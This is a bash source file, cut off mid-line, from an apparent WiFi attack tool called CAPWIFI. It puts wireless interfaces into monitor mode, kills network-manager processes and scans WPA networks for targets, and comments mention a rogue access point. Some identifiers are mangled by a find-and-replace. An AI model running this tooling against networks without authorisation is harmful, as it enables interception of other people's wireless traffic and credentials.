trap capcap_handle_target_absent SIGUSR1
trap capcap_handle_target_present SIGUSR2


# ============================================================ #
# =============== < Resolution & Positioning > =============== #
# ============================================================ #
capcap_set_resolution() { # Windows + Resolution

  # In tmux/headless mode, geometry variables are unused; skip X11 resolution detection.
  if [ "$CAPCAPDisplayMode" = "tmux" ] || [ "$CAPCAPDisplayMode" = "headless" ]; then
    TOPLEFT="" ; TOPRIGHT="" ; TOP=""
    BOTTOMLEFT="" ; BOTTOMRIGHT="" ; BOTTOM=""
    LEFT="" ; RIGHT=""
    TOPLEFTBIG="" ; TOPRIGHTBIG=""
    return 0
  fi

  # Get dimensions
  # Verify this works on Kali before commiting.
  # shopt -s checkwinsize; (:;:)
  # SCREEN_SIZE_X="$LINES"
  # SCREEN_SIZE_Y="$COLUMNS"

  SCREEN_SIZE=$(xdpyinfo | grep dimension | awk '{print $4}' | tr -d "(")
  SCREEN_SIZE_X=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $1}'))
  SCREEN_SIZE_Y=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $2}'))

  # Calculate proportional windows
  if hash bc ;then
    PROPOTION=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$SCREEN_SIZE_Y}")/1 | bc)
    NEW_SCREEN_SIZE_X=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$CAPCAPWindowRatio}")/1 | bc)
    NEW_SCREEN_SIZE_Y=$(echo $(awk "BEGIN {print $SCREEN_SIZE_Y/$CAPCAPWindowRatio}")/1 | bc)

    NEW_SCREEN_SIZE_BIG_X=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_X/$CAPCAPWindowRatio}")/1 | bc)
    NEW_SCREEN_SIZE_BIG_Y=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_Y/$CAPCAPWindowRatio}")/1 | bc)

    SCREEN_SIZE_MID_X=$(echo $(($SCREEN_SIZE_X + ($SCREEN_SIZE_X - 2 * $NEW_SCREEN_SIZE_X) / 2)))
    SCREEN_SIZE_MID_Y=$(echo $(($SCREEN_SIZE_Y + ($SCREEN_SIZE_Y - 2 * $NEW_SCREEN_SIZE_Y) / 2)))

    # Upper windows
    TOPLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0+0"
    TOPRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+0"
    TOP="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X+0"

    # Lower windows
    BOTTOMLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-0"
    BOTTOMRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0-0"
    BOTTOM="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X-0"

    # Y mid
    LEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-$SCREEN_SIZE_MID_Y"
    RIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+$SCREEN_SIZE_MID_Y"

    # Big
    TOPLEFTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y+0+0"
    TOPRIGHTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y-0+0"
  fi
}


# ============================================================ #
# ================= < Sequencing Framework > ================= #
# ============================================================ #
# The following lists some problems with the framework's design.
# The list below is a list of DESIGN FLAWS, not framework bugs.
# * Sequenced undo instructions' return value is being ignored.
# * A global is generated for every new namespace being used.
# * It uses eval too much, but it's bash, so that's not so bad.
# TODO: Try to fix this or come up with a better alternative.
declare -rA CAPCAPUndoable=( \
  ["set"]="unset" \
  ["prep"]="unprep" \
  ["run"]="halt" \
  ["start"]="stop" \
)

# Yes, I know, the identifiers are fucking ugly. If only we had
# some type of mangling with bash identifiers, that'd be great.
capcap_do() {
  if [ ${#@} -lt 2 ]; then return -1; fi

  local -r __capcap_do__namespace=$1
  local -r __capcap_do__identifier=$2

  echo ">>> CALLING: ${__capcap_do__namespace}_$__capcap_do__identifier" >> "$CAPCAPOutputDevice"
  # Notice, the instruction will be adde to the Do Log
  # regardless of whether it succeeded or failed to execute.
  eval FXDLog_$__capcap_do__namespace+=\("$__capcap_do__identifier"\)
  echo ">>> ABOUT TO EVAL: ${__capcap_do__namespace}_$__capcap_do__identifier" >> "$CAPCAPOutputDevice"
  eval ${__capcap_do__namespace}_$__capcap_do__identifier "${@:3}"
  local result=$?
  echo ">>> RESULT: $result" >> "$CAPCAPOutputDevice"
  return $result
}

capcap_undo() {
  if [ ${#@} -ne 1 ]; then return -1; fi

  local -r __capcap_undo__namespace=$1

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  eval local __capcap_undo__history=\("\${FXDLog_$__capcap_undo__namespace[@]}"\)

  eval echo \$\{FXDLog_$__capcap_undo__namespace[@]\} \
    >> $CAPCAPOutputDevice

  local __capcap_undo__i
  for (( __capcap_undo__i=${#__capcap_undo__history[@]}; \
    __capcap_undo__i > 0; __capcap_undo__i-- )); do
    local __capcap_undo__instruction=${__capcap_undo__history[__capcap_undo__i-1]}
    local __capcap_undo__command=${__capcap_undo__instruction%%_*}
    local __capcap_undo__identifier=${__capcap_undo__instruction#*_}

    echo "Do ${CAPCAPUndoable["$__capcap_undo__command"]}_$__capcap_undo__identifier" \
      >> $CAPCAPOutputDevice
    if eval ${__capcap_undo__namespace}_${CAPCAPUndoable["$__capcap_undo__command"]}_$__capcap_undo__identifier; then
      echo "Undo-chain succeded." >> $CAPCAPOutputDevice
      eval FXDLog_$__capcap_undo__namespace=\("${__capcap_undo__history[@]::$__capcap_undo__i}"\)
      eval echo History\: \$\{FXDLog_$__capcap_undo__namespace[@]\} \
        >> $CAPCAPOutputDevice
      return 0
    fi
  done

  return -2 # The undo-chain failed.
}

capcap_done() {
  if [ ${#@} -ne 1 ]; then return -1; fi

  local -r __capcap_done__namespace=$1

  eval "CapCapDone=\${FXDLog_$__capcap_done__namespace[-1]}"

  if [ ! "$CapCapDone" ]; then return 1; fi
}

capcap_done_reset() {
  if [ ${#@} -ne 1 ]; then return -1; fi

  local -r __capcap_done_reset__namespace=$1

  eval FXDLog_$__capcap_done_reset__namespace=\(\)
}

capcap_do_sequence() {
  if [ ${#@} -ne 2 ]; then return 1; fi

  # TODO: Implement an alternative, better method of doing
  # what this subroutine does, maybe using for-loop iteCAPCAPWindowRation.
  # The for-loop implementation must support the subroutines
  # defined above, including updating the namespace tracker.

  local -r __capcap_do_sequence__namespace=$1

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  local __capcap_do_sequence__sequence=("${!2}")

  if [ ${#__capcap_do_sequence__sequence[@]} -eq 0 ]; then
    return -2
  fi

  local -A __capcap_do_sequence__index=()

  local i
  for i in $(seq 0 $((${#__capcap_do_sequence__sequence[@]} - 1))); do
    __capcap_do_sequence__index["${__capcap_do_sequence__sequence[i]}"]=$i
  done

  # Cap how many times any single instruction can be retried after an
  # undo-chain falls back to it, so a step that can never succeed (e.g. a
  # missing precondition) can't keep the sequence retrying forever.
  local -r __capcap_do_sequence__maxRetries=3
  local -A __capcap_do_sequence__retries=()

  # Start sequence with the first instruction available.
  local __capcap_do_sequence__instructionIndex=0
  local __capcap_do_sequence__instruction=${__capcap_do_sequence__sequence[0]}
  echo "SEQUENCE: ${__capcap_do_sequence__sequence[@]}" >> "$CAPCAPOutputDevice"
  while [ "$__capcap_do_sequence__instruction" ]; do
    echo "INDEX=$__capcap_do_sequence__instructionIndex INSTRUCTION=$__capcap_do_sequence__instruction" >> "$CAPCAPOutputDevice"
    if ! capcap_do $__capcap_do_sequence__namespace $__capcap_do_sequence__instruction; then
      if ! capcap_undo $__capcap_do_sequence__namespace; then
        return -2
      fi

      # Synchronize the current instruction's index by checking last.
      if ! capcap_done $__capcap_do_sequence__namespace; then
        return -3;
      fi

      __capcap_do_sequence__instructionIndex=${__capcap_do_sequence__index["$CapCapDone"]}

      if [ ! "$__capcap_do_sequence__instructionIndex" ]; then
        return -4
      fi

      local __capcap_do_sequence__retryKey=$((__capcap_do_sequence__instructionIndex + 1))
      local __capcap_do_sequence__retryCount=$(( \
        ${__capcap_do_sequence__retries[$__capcap_do_sequence__retryKey]:-0} + 1))
      __capcap_do_sequence__retries[$__capcap_do_sequence__retryKey]=$__capcap_do_sequence__retryCount

      if [ $__capcap_do_sequence__retryCount -gt $__capcap_do_sequence__maxRetries ]; then
        echo "Sequence gave up: too many retries resuming at instruction '${__capcap_do_sequence__sequence[$__capcap_do_sequence__retryKey]}'." \
          >> $CAPCAPOutputDevice
        return -5
      fi
    else
      # Forward progress past this step: clear its retry budget so only a
      # genuine no-progress loop (a step that resumes and fails without ever
      # advancing) can hit the cap. User-initiated "go back" navigation
      # always advances again on the way forward, so it must not accumulate
      # toward the limit and eject the user to the attack menu.
      __capcap_do_sequence__retries[$((__capcap_do_sequence__instructionIndex + 1))]=0
      let __capcap_do_sequence__instructionIndex++
    fi

    __capcap_do_sequence__instruction=${__capcap_do_sequence__sequence[$__capcap_do_sequence__instructionIndex]}
    echo "Running next: $__capcap_do_sequence__instruction" \
      >> $CAPCAPOutputDevice
  done
}


# ============================================================ #
# ================= < Load All Subroutines > ================= #
# ============================================================ #
capcap_header() {
  format_apply_autosize "[%*s]\n"
  local verticalBorder=$FormatApplyAutosize

  format_apply_autosize "[%*s${CSRed}CAPWIFI $CAPCAPVersion${CSWht}.${CSBlu}$CAPCAPRevision$CSRed    <$CIRed C${CIYel}apture$CIRed T${CIYel}he$CIRed W${CIYel}iFi$CClr$CSYel >%*s$CSBlu]\n"
  local headerTextFormat="$FormatApplyAutosize"

  capcap_conditional_clear

  echo -e "$(printf "$CSRed$verticalBorder" "" | sed -r "s/ /~/g")"
  printf "$CSRed$verticalBorder" ""
  printf "$headerTextFormat" "" ""
  printf "$CSBlu$verticalBorder" ""
  echo -e "$(printf "$CSBlu$verticalBorder" "" | sed -r "s/ /~/g")$CClr"
  echo
  echo
}

# ======================= < Language > ======================= #
capcap_unset_language() {
  CapCapLanguage=""

  if [ "$CAPCAPPreferencesFile" ]; then
    sed -i.backup "/CapCapLanguage=.\+/ d" "$CAPCAPPreferencesFile"
  fi
}

capcap_set_language() {
  if [ ! "$CapCapLanguage" ]; then
    if [ "$CAPCAPAuto" ]; then
      CapCapLanguage="en"
    else
      # Get all languages available.
      local languageCodes
      readarray -t languageCodes < <(ls -1 language | sed -E 's/\.sh//')

      local languages
      readarray -t languages < <(
        head -n 3 language/*.sh |
        grep -E "^# native: " |
        sed -E 's/# \w+: //'
      )

      # Prepare choices array for io_query_choice
      local choices=()
      for i in "${!languageCodes[@]}"; do
        choices+=("${languageCodes[i]} / ${languages[i]}")
      done
      choices+=("Exit")

      io_query_choice "$CAPCAPVLine Select your language" choices[@]

      # Handle exit selection
      if [ "$IOQueryChoice" = "Exit" ]; then
        capcap_handle_exit
      fi

      # Extract language code from selection (format: "code / name")
      CapCapLanguage=$(echo "$IOQueryChoice" | cut -d ' ' -f 1)

      echo # Do not remove.
    fi
  fi

  # Check if all language files are present for the selected language.
  find -type d -name language | while read language_dir; do
    if [ ! -e "$language_dir/${CapCapLanguage}.sh" ]; then
      echo -e "$CAPCAPVLine ${CYel}Warning${CClr}, missing language file:"
      echo -e "\t$language_dir/${CapCapLanguage}.sh"
      return 1
    fi
  done

  if [ $? -eq 1 ]; then # If a file is missing, fall back to english.
    echo -e "\n\n$CAPCAPVLine Falling back to English..."; sleep 5
    CapCapLanguage="en"
  fi

  source "$CAPCAPPath/language/$CapCapLanguage.sh"

  if [ "$CAPCAPPreferencesFile" ]; then
    if more $CAPCAPPreferencesFile | \
      grep -q "CapCapLanguage=.\+" &> /dev/null; then
      sed -r "s/CapCapLanguage=.+/CapCapLanguage=$CapCapLanguage/g" \
      -i.backup "$CAPCAPPreferencesFile"
    else
      echo "CapCapLanguage=$CapCapLanguage" >> "$CAPCAPPreferencesFile"
    fi
  fi
}

# ====================== < Interfaces > ====================== #
declare -A CapCapInterfaces=() # Global interfaces' registry.

capcap_deallocate_interface() { # Release interfaces
  if [ ! "$1" ]; then return 1; fi

  local -r oldIdentifier=$1
  local -r newIdentifier=${CapCapInterfaces[$oldIdentifier]}

  # If the interface no longer exists (e.g. NetworkManager renamed it back
  # outside capcap), purge any stale registry entries so a later allocation
  # doesn't short-circuit onto a dead interface name.
  if ! interface_is_real "$oldIdentifier"; then
    if [ "$newIdentifier" ]; then
      unset CapCapInterfaces[$oldIdentifier]
      unset CapCapInterfaces[$newIdentifier]
    fi
    return 1
  fi

  # Assure the interface is in the allocation table.
  if [ ! "$newIdentifier" ]; then return 2; fi

  local interfaceIdentifier=$newIdentifier
  echo -e "$CWht[$CSRed-$CWht] "$(
    io_dynamic_output "$CAPCAPDeallocatingInterfaceNotice"
  )"$CClr"

  if interface_is_wireless $oldIdentifier; then
    # If interface was allocated by airmon-ng, deallocate with it.
    if [[ "$oldIdentifier" == *"mon"* || "$oldIdentifier" == "prism"* ]]; then
      if ! airmon-ng stop $oldIdentifier &>> $CAPCAPOutputDevice; then
        return 4
      fi
    else
      # Attempt deactivating monitor mode on the interface.
      if ! interface_set_mode $oldIdentifier managed; then
        return 3
      fi

      # Attempt to restore the original interface identifier.
      if ! interface_reidentify "$oldIdentifier" "$newIdentifier"; then
        return 5
      fi
    fi

    # Hand the interface back to NetworkManager now that we're done with it.
    if [ -x "$(command -v nmcli)" ]; then
      nmcli device set "$newIdentifier" managed yes &>> $CAPCAPOutputDevice
    fi
  fi

  # Once successfully renamed, remove from allocation table.
  unset CapCapInterfaces[$oldIdentifier]
  unset CapCapInterfaces[$newIdentifier]
}

# Parameters: <interface_identifier>
# ------------------------------------------------------------ #
# Return 1: No interface identifier was passed.
# Return 2: Interface identifier given points to no interface.
# Return 3: Unable to determine interface's driver.
# Return 4: CapCap failed to reidentify interface.
# Return 5: Interface allocation failed (identifier missing).
capcap_allocate_interface() { # Reserve interfaces
  if [ ! "$1" ]; then
    echo "Allocation failed: no identifier" >> "$CAPCAPOutputDevice"
    return 1
  fi

  local -r identifier=$1
  echo "=== ALLOCATE: $identifier ===" >> "$CAPCAPOutputDevice"
  echo "CapCapInterfaces[$identifier] = '${CapCapInterfaces[$identifier]}'" >> "$CAPCAPOutputDevice"

  # If the interface is already in allocation table, we're done.
  if [ "${CapCapInterfaces[$identifier]+x}" ]; then
    echo "Interface already allocated: $identifier -> ${CapCapInterfaces[$identifier]}" >> "$CAPCAPOutputDevice"
    local mappedIdentifier="${CapCapInterfaces[$identifier]}"
    # The allocation is live if EITHER side of the bidirectional mapping
    # still exists. When the identifier passed is itself an already-renamed
    # interface (e.g. re-selecting capwl0 to also serve as the rogue AP),
    # the reverse mapping points at the now-gone original name, yet the
    # interface itself is real and must NOT be torn down and re-initialized.
    if interface_is_real "$identifier" || \
      interface_is_real "$mappedIdentifier"; then
      return 0
    fi
    echo "Stale allocation purged: $identifier -> $mappedIdentifier" >> "$CAPCAPOutputDevice"
    unset CapCapInterfaces[$identifier]
    unset CapCapInterfaces[$mappedIdentifier]
  fi

  if ! interface_is_real $identifier; then
    echo "Interface not real: $identifier" >> "$CAPCAPOutputDevice"
    return 2
  fi


  local interfaceIdentifier=$identifier
  echo -e "$CWht[$CSGrn+$CWht] "$(
    io_dynamic_output "$CAPCAPAllocatingInterfaceNotice"
  )"$CClr"


  if interface_is_wireless $identifier; then
    # Stop NetworkManager from managing the interface before we rename it
    # or change its mode. Otherwise NetworkManager can reassert the
    # interface's original name right after capcap renames it, and the
    # two end up fighting over the name indefinitely.
    if [ -x "$(command -v nmcli)" ]; then
      nmcli device set "$identifier" managed no &>> $CAPCAPOutputDevice
    fi

    # Unblock wireless interfaces to make them available.
    echo -e "$CAPCAPVLine $CAPCAPUnblockingWINotice"
    rfkill unblock all &>> $CAPCAPOutputDevice

    if [ "$CAPCAPWIReloadDriver" ]; then
      # Get selected interface's driver details/info-descriptor.
      echo -e "$CAPCAPVLine $CAPCAPGatheringWIInfoNotice"

      if ! interface_driver "$identifier"; then
        echo -e "$CAPCAPVLine$CRed $CAPCAPUnknownWIDriverError"
        sleep 3
        return 3
      fi

      # Notice: This local is function-scoped, not block-scoped.
      local -r driver="$InterfaceDriver"

      # Unload the driver module from the kernel.
      rmmod -f $driver &>> $CAPCAPOutputDevice

      # Wait while interface becomes unavailable.
      echo -e "$CAPCAPVLine "$(
        io_dynamic_output $CAPCAPUnloadingWIDriverNotice
      )
      while interface_physical "$identifier"; do
        sleep 1
      done
    fi

    if [ "$CAPCAPWIKillProcesses" ]; then
      # Get list of potentially troublesome programs.
      echo -e "$CAPCAPVLine $CAPCAPFindingConflictingProcessesNotice"

      # Kill potentially troublesome programs.
      echo -e "$CAPCAPVLine $CAPCAPKillingConflictingProcessesNotice"

      # TODO: Make the loop below airmon-ng independent.
      # Maybe replace it with a list of network-managers?
      local -a killExclude=()
      if [ "$CAPCAPKillExclude" ]; then
        IFS=',' read -ra killExclude <<< "$CAPCAPKillExclude"
      fi
      while IFS= read -r program; do
        [ -z "$program" ] && continue
        local excluded=""
        local keep
        for keep in "${killExclude[@]}"; do
          if [ "$program" = "$keep" ]; then excluded=1; break; fi
        done
        if [ "$excluded" ]; then
          echo "Sparing excluded process: $program" >> $CAPCAPOutputDevice
          continue
        fi
        killall "$program" &>> $CAPCAPOutputDevice
      done < <(timeout 5 airmon-ng check 2>/dev/null | awk '$1 ~ /^[0-9]+$/{print $2}')
    fi

    if [ "$CAPCAPWIReloadDriver" ]; then
      # Reload the driver module into the kernel.
      modprobe "$driver" &>> $CAPCAPOutputDevice

      # Wait while interface becomes available.
      echo -e "$CAPCAPVLine "$(
        io_dynamic_output $CAPCAPLoadingWIDriverNotice
      )
      while ! interface_physical "$identifier"; do
        sleep 1
      done
    fi

    # Set wireless flag to prevent having to re-query.
    local -r allocatingWirelessInterface=1
  fi

  # If we're using the interface library, reidentify now.
  # If usuing airmon-ng, let airmon-ng rename the interface.
  if [ ! $CAPCAPAirmonNG ]; then
    echo -e "$CAPCAPVLine $CAPCAPReidentifyingInterface"

    # Prevent interface-snatching by renaming the interface.
    if [ $allocatingWirelessInterface ]; then
      # Get next wireless interface to add to CapCapInterfaces global.
      capcap_next_assignable_interface capwl
    else
      # Get next ethernet interface to add to CapCapInterfaces global.
      capcap_next_assignable_interface capet
    fi

    if ! interface_reidentify $identifier $CapCapNextAssignableInterface; then
      return 4 # If reidentifying failed, abort immediately.
    fi
  fi

  if [ $allocatingWirelessInterface ]; then
    # Activate wireless interface monitor mode and save identifier.
    echo -e "$CAPCAPVLine $CAPCAPStartingWIMonitorNotice"

    # TODO: Consider the airmon-ng flag is set, monitor mode is
    # already enabled on the interface being allocated, and the
    # interface identifier is something non-airmon-ng standard.
    # The interface could already be in use by something else.
    # Snatching or crashing interface issues could occur.

    # NOTICE: Conditionals below populate newIdentifier on success.
    if [ $CAPCAPAirmonNG ]; then
      local -r newIdentifier=$(
        airmon-ng start $identifier |
        grep "monitor .* enabled" |
        grep -oP "wl[a-zA-Z0-9]+mon|mon[0-9]+|prism[0-9]+"
      )
    else
      # Attempt activating monitor mode on the interface.
      if interface_set_mode $CapCapNextAssignableInterface monitor; then
        # Register the new identifier upon consecutive successes.
        local -r newIdentifier=$CapCapNextAssignableInterface
      else
        # If monitor-mode switch fails, undo rename and abort.
        interface_reidentify $CapCapNextAssignableInterface $identifier
      fi
    fi
  fi

  # On failure to allocate the interface, we've got to abort.
  # Notice: If the interface was already in monitor mode and
  # airmon-ng is activated, WE didn't allocate the interface.
  if [ ! "$newIdentifier" -o "$newIdentifier" = "$identifier" ]; then
    echo -e "$CAPCAPVLine $CAPCAPInterfaceAllocationFailedError"
    sleep 3
    return 5
  fi

  # Register identifiers to allocation hash table.
  CapCapInterfaces[$newIdentifier]=$identifier
  CapCapInterfaces[$identifier]=$newIdentifier

  echo -e "$CAPCAPVLine $CAPCAPInterfaceAllocatedNotice"
  sleep 3

  # Notice: Interfaces are accessed with their original identifier
  # as the key for the global CapCapInterfaces hash/map/dictionary.
}

# Parameters: <interface_prefix>
# Description: Prints next available assignable interface name.
# ------------------------------------------------------------ #
capcap_next_assignable_interface() {
  # Find next available interface by checking global hash AND physical interfaces
  local -r prefix=$1
  local index=0
  while [ "${CapCapInterfaces[$prefix$index]}" ] || interface_physical "$prefix$index"; do
    let index++
  done
  CapCapNextAssignableInterface="$prefix$index"
}

# Parameters: <interfaces:lambda> [<query>]
# Note: The interfaces lambda must print an interface per line.
# ------------------------------------------------------------ #
# Return -1: Go back
# Return  1: Missing interfaces lambda identifier (not passed).
capcap_get_interface() {
  if ! type -t "$1" &> /dev/null; then return 1; fi

  if [ "$2" ]; then
    local -r interfaceQuery="$2"
  else
    local -r interfaceQuery=$CAPCAPInterfaceQuery
  fi

  # Auto mode: select first available interface (or --interface if specified).
  if [ "$CAPCAPAuto" ]; then
    # Use --interface hint only if it isn't already allocated.
    if [ "$CAPCAPInterface" ] && interface_is_wireless "$CAPCAPInterface" \
      && [ -z "${CapCapInterfaces[$CAPCAPInterface]+x}" ]; then
      CapCapInterfaceSelected="$CAPCAPInterface"
      interface_chipset "$CAPCAPInterface" 2>/dev/null
      interface_bands "$CAPCAPInterface" 2>/dev/null
      local __autoBandTag=""
      if [ "$InterfaceBands" ] && [ "$InterfaceBands" != "unknown" ]; then __autoBandTag="[$InterfaceBands] "; fi
      CapCapInterfaceSelectedInfo="${__autoBandTag}${InterfaceChipset:-}"
      CapCapInterfaceSelectedState="[+]"
      return 0
    fi
    local autoInterfaces
    readarray -t autoInterfaces < <($1)
    local autoIface
    for autoIface in "${autoInterfaces[@]}"; do
      # Skip interfaces already in use (allocated or renamed).
      if [ "$autoIface" ] \
        && [ -z "${CapCapInterfaces[$autoIface]+x}" ]; then
        CapCapInterfaceSelected="$autoIface"
        interface_chipset "$autoIface" 2>/dev/null
        interface_bands "$autoIface" 2>/dev/null
        local __autoBandTag2=""
        if [ "$InterfaceBands" ] && [ "$InterfaceBands" != "unknown" ]; then __autoBandTag2="[$InterfaceBands] "; fi
        CapCapInterfaceSelectedInfo="${__autoBandTag2}${InterfaceChipset:-}"
        CapCapInterfaceSelectedState="[+]"
        return 0
      fi
    done
    echo "Auto mode: no interfaces available." >> $CAPCAPOutputDevice
    return 1
  fi

  while true; do
    local candidateInterfaces
    readarray -t candidateInterfaces < <($1)
    local interfacesAvailable=()
    local interfacesAvailableInfo=()
    local interfacesAvailableBands=()
    local interfacesAvailableBus=()
    local interfacesAvailableColor=()
    local interfacesAvailableState=()

    # Gather information from all available interfaces.
    local candidateInterface
    for candidateInterface in "${candidateInterfaces[@]}"; do
      if [ ! "$candidateInterface" ]; then
        local skipOption=1
        continue
      fi

      interface_chipset "$candidateInterface"
      interface_bands "$candidateInterface" 2>/dev/null
      if [ "$InterfaceBands" ] && [ "$InterfaceBands" != "unknown" ]; then
        interfacesAvailableBands+=("[$InterfaceBands]")
      else
        interfacesAvailableBands+=("")
      fi
      if [ "$InterfaceHardwareBus" ]; then
        interfacesAvailableBus+=("[$InterfaceHardwareBus]")
      else
        interfacesAvailableBus+=("")
      fi
      interfacesAvailableInfo+=("$InterfaceChipset")

      # If it has already been allocated, we can use it at will.
      local candidateInterfaceAlt=${CapCapInterfaces["$candidateInterface"]}
      if [ "$candidateInterfaceAlt" ]; then
        # The candidate is already allocated. Show it regardless of whether
        # it's the original or renamed interface. User will select by what they see.
        interfacesAvailable+=("$candidateInterface")

        interfacesAvailableColor+=("$CGrn")
        interfacesAvailableState+=("[*]")
      else
        interfacesAvailable+=("$candidateInterface")

        interface_state "$candidateInterface"

        if [ "$InterfaceState" = "up" ]; then
          interfacesAvailableColor+=("$CPrp")
          interfacesAvailableState+=("[-]")
        else
          interfacesAvailableColor+=("$CClr")
          interfacesAvailableState+=("[+]")
        fi
      fi
    done

    # If only one interface exists and it's not unavailable, choose it.
    if [ "${#interfacesAvailable[@]}" -eq 1 -a \
      "${interfacesAvailableState[0]}" != "[-]" -a \
      "$skipOption" == "" ]; then CapCapInterfaceSelected="${interfacesAvailable[0]}"
      CapCapInterfaceSelectedState="${interfacesAvailableState[0]}"
      CapCapInterfaceSelectedInfo="${interfacesAvailableInfo[0]}"
      break
    else
      if [ $skipOption ]; then
        interfacesAvailable+=("$CAPCAPGeneralSkipOption")
        interfacesAvailableColor+=("$CClr")
        interfacesAvailableBands+=("")
        interfacesAvailableBus+=("")
      fi

      interfacesAvailable+=(
        "$CAPCAPGeneralRepeatOption"
        "$CAPCAPGeneralBackOption"
      )

      interfacesAvailableColor+=(
        "$CClr"
        "$CClr"
      )

      interfacesAvailableBands+=("" "")
      interfacesAvailableBus+=("" "")

      local __ifaceMaxLen=8
      local __ifaceEntry
      for __ifaceEntry in "${interfacesAvailable[@]}"; do
        [ ${#__ifaceEntry} -gt $__ifaceMaxLen ] && __ifaceMaxLen=${#__ifaceEntry}
      done

      local __bandMaxLen=0
      local __bandEntry
      for __bandEntry in "${interfacesAvailableBands[@]}"; do
        [ ${#__bandEntry} -gt $__bandMaxLen ] && __bandMaxLen=${#__bandEntry}
      done

      local __busMaxLen=0
      local __busEntry
      for __busEntry in "${interfacesAvailableBus[@]}"; do
        [ ${#__busEntry} -gt $__busMaxLen ] && __busMaxLen=${#__busEntry}
      done

      format_apply_autosize \
        "$CRed[$CSYel%1d$CClr$CRed]%b %-${__ifaceMaxLen}b %3s %-${__bandMaxLen}s %-${__busMaxLen}s$CClr %-*.*s\n"

      io_query_format_fields \
        "$CAPCAPVLine $interfaceQuery" "$FormatApplyAutosize" \
        interfacesAvailableColor[@] interfacesAvailable[@] \
        interfacesAvailableState[@] interfacesAvailableBands[@] \
        interfacesAvailableBus[@] interfacesAvailableInfo[@]

      echo

      case "${IOQueryFormatFields[1]}" in
        "$CAPCAPGeneralSkipOption")
          CapCapInterfaceSelected=""
          CapCapInterfaceSelectedState=""
          CapCapInterfaceSelectedInfo=""
          return 0;;
        "$CAPCAPGeneralRepeatOption") continue;;
        "$CAPCAPGeneralBackOption") return -1;;
        *)
          CapCapInterfaceSelected="${IOQueryFormatFields[1]}"
          CapCapInterfaceSelectedState="${IOQueryFormatFields[2]}"
          CapCapInterfaceSelectedInfo="${IOQueryFormatFields[5]}"
          break;;
      esac
    fi
  done
}


# ============== < CapCap Target Subroutines > ============== #
# Parameters: interface [ channel(s) [ band(s) ] ]
# ------------------------------------------------------------ #
# Return 1: Missing monitor interface.
# Return 2: Xterm failed to start airmon-ng.
# Return 3: Invalid capture file was generated.
# Return 4: No candidates were detected.
capcap_target_get_candidates() {
  # Assure a valid wireless interface for scanning was given.
  if [ ! "$1" ] || ! interface_is_wireless "$1"; then return 1; fi

  echo -e "$CAPCAPVLine $CAPCAPStartingScannerNotice"
  if [ "$CAPCAPAuto" ]; then
    # shellcheck disable=SC2059
    echo -e "$CAPCAPVLine $(printf "$CAPCAPStartingScannerAutoNotice" "$CAPCAPScanTime")"
  else
    echo -e "$CAPCAPVLine $CAPCAPStartingScannerTip"
  fi

  # Assure all previous scan results have been cleared.
  sandbox_remove_workfile "$CAPCAPWorkspacePath/dump*"

  # Begin scanner and output all results to "dump-01.csv."
  local channelParam="${2:+--channel $2}"
  local bandParam="${3:+--band $3}"
  local scanCmd="airodump-ng -Mat WPA $channelParam $bandParam -w \"$CAPCAPWorkspacePath/dump\" $1"

  if [ "$CAPCAPAuto" ]; then
    # In auto mode, run scanner for --scan-time seconds then kill it.
    capcap_status "SCAN_START interface=$1 duration=${CAPCAPScanTime}s"
    local scannerPID
    capcap_window_open scannerPID "$CAPCAPScannerHeader" \
      "$TOPLEFTBIG" "#000000" "#FFFFFF" "$scanCmd"
    sleep "$CAPCAPScanTime"
    capcap_window_close scannerPID
    # Give airodump-ng a moment to flush output files.
    sleep 1
  else
    if ! capcap_window_open "" "$CAPCAPScannerHeader" \
      "$TOPLEFTBIG" "#000000" "#FFFFFF" "$scanCmd" 2>> $CAPCAPOutputDevice; then
      echo -e "$CAPCAPVLine$CRed $CAPCAPGeneralXTermFailureError"
      sleep 5
      return 2
    fi
  fi

  # Sanity check the capture files generated by the scanner.
  # If the file doesn't exist, or if it's empty, abort immediately.
  if [ ! -f "$CAPCAPWorkspacePath/dump-01.csv" -o \
    ! -s "$CAPCAPWorkspacePath/dump-01.csv" ]; then
    sandbox_remove_workfile "$CAPCAPWorkspacePath/dump*"
    return 3
  fi

  # Syntheize scan opeCAPCAPWindowRation results from output file "dump-01.csv."
  echo -e "$CAPCAPVLine $CAPCAPPreparingScannerResultsNotice"
  # WARNING: The code below may break with different version of airmon-ng.
  # The times matching operator "{n}" isn't supported by mawk (alias awk).
  # readarray CAPCAPTargetCandidates < <(
  #   gawk -F, 'NF==15 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}'
  #   $CAPCAPWorkspacePath/dump-01.csv
  # )
  # readarray CAPCAPTargetCandidatesClients < <(
  #   gawk -F, 'NF==7 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}'
  #   $CAPCAPWorkspacePath/dump-01.csv
  # )
  local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
  readarray CapCapTargetCandidates < <(
    awk -F, "NF>=15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
